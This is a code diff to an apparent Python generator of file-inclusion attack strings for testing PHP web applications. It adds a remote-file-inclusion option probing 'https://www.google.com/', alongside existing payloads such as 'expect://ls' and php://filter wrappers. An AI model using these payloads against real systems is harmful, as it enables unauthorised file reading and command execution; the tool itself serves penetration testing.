@@ -125,7 +125,8 @@ defaultOptions = {
     "phpfilter64": True,
     "phpexpect": True,
     "phpstreams": True,
-    "phpstring": False
+    "phpstring": False,
+    "rfi": True
 }
 
 fullOptions = {
@@ -145,7 +146,8 @@ fullOptions = {
     "phpfilter64": True,
     "phpexpect": True,
     "phpstreams": True,
-    "phpstring": True
+    "phpstring": True,
+    "rfi": True
 }
 
 def generate(files, options):
@@ -161,6 +163,7 @@ def generate(files, options):
     forward += filterB64(files) if options.get("phpfilter64") else [] # just takes the base files, doesnt need dir traversal, do want to append %00 though.
     forward += ["expect://ls"] if options.get("phpexpect") else []
     forward += ["php://stdin", "php://stdout", "php://stderr"] if options.get("phpstreams") else []
+    forward += ["https://www.google.com/"] if options.get("rfi") else []
     
     output = forward.copy()
     output += suffixNullbytes(forward) if options.get("nullbytes") else []
